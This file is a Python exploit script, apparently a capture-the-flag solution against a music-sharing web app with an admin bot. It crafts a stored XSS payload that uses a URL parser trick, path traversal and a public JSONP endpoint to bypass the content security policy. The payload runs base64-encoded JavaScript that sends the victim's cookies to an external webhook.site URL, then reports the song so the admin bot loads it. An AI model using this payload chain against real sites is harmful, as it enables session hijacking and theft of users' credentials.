#!/usr/bin/python3
import requests
import sys
import re

from base64 import b64encode


USERNAME = "Vego"
PASSWORD = "Password123"
# URL = "http://chall.k1nd4sus.it:30503"
URL = "http://127.0.0.1:5000"
HOOK = "https://webhook.site/04ecf2d2-486e-4d3e-84ed-d790dffd8711"


# NOTE: For some reason this exploit doesn't work locally on docker, but worked remotely
def solve():
    s = requests.Session()
    data = {'username': USERNAME, 'password': PASSWORD}

    # Register if not already registered
    if len(sys.argv) > 1 and sys.argv[1] == '-r':
        s.post(URL + '/register', data=data)

    s.post(URL + '/login', data=data)

    js_payload = f"location.href=`{HOOK}?c=`+document.cookie"
    b64_js = b64encode(js_payload.encode()).decode()

    payload =  URL                          # Force browser back to local
    payload += r"\@open.spotify.com"        # The 'allowed' host
    payload += "/embed/../../dashboard"     # Path traversal to XSS-vulnerable page
    payload += "?search=%3Cscript%20src=https://www.w3schools.com/js/demo_jsonp2.php?"  # W3's JSONP Endpoint to bypass CSP
    payload += f"callback=eval(atob('{b64_js}'));//%3E%3C/script%3E"     # Callback to webhook

    # Add song with crafted URL
    title = 'pwned'
    data = {'title': title, 'spotify_url': payload}
    s.post(URL + '/add_song', data=data)
    print(f"[!] Uploaded song with payload: {payload}")

    # Get song ID
    res = s.get(URL + '/dashboard')
    song_id = re.search(fr'href="/song/(\d+)">\n\s+{title}\n\s+</a>', res.text).group(1)
    print(f"[+] Retrieved Song ID: {song_id}")

    # Report song and check the webhook
    data = {'song_id': song_id}
    res = s.post(URL + '/report', data=data)
    print("[!] Song reported to the Admin Bot!")


if __name__ == '__main__':
    solve()
